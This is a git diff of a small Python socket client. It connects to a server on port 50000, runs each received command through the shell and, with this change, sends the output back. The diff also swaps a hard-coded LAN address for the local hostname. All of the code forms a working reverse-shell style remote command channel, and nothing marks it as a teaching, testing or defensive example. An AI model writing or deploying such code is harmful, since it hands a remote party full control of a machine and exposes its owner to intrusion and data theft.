@@ -1,5 +1,6 @@
 import socket
 from os import system
+from subprocess import check_output
 
 
 class Socket:
@@ -10,7 +11,7 @@ class Socket:
     def connect_to_server(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.connect(("192.168.178.26", 50000))
+            self.active_socket.connect((socket.gethostname(), 50000))
             Socket.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
@@ -24,7 +25,12 @@ class Socket:
             self.established = False
             return False
         cmd = cmd.decode()
-        system(cmd)
+        output = check_output(cmd, shell=True)
+        output = ''.join(chr(i) for i in output)
+        self.send_msg(output)
+
+    def send_msg(self, msg):
+        self.active_socket.send(msg.encode())
 
 
 connection = Socket()
